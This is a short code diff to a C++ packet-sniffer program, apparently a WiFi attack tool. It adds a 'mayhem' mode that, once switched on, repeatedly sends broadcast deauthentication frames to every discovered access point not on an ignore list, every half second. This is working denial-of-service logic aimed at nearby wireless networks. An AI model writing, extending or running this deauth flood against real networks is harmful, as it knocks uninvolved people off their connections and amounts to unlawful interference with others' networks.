@@ -271,11 +271,24 @@ void Sniffer::readloop_topgun() {
 
     if (command == START_MAYHEM) {
       toggle_red_red();
+      mayhem_on = 1;
       std::cout << "Starting mayhem" << std::endl;
     } else if (command == STOP_MAYHEM) {
       toggle_red_red();
+      mayhem_on = 0;
       std::cout << "Stopping mayhem" << std::endl;
     }
+
+    if (mayhem_on)
+      for (const auto &[ssid, ap] : aps) {
+        if (ignored_networks.find(ssid) != ignored_networks.end())
+          continue;
+
+        std::cout << "Sending deauth for whole network: " << ssid << std::endl;
+        ap->send_deauth(&send_iface, BROADCAST_ADDR);
+      }
+
+    std::this_thread::sleep_for(std::chrono::milliseconds(500));
   }
 
   std::cout << "Readloop ended" << std::endl;
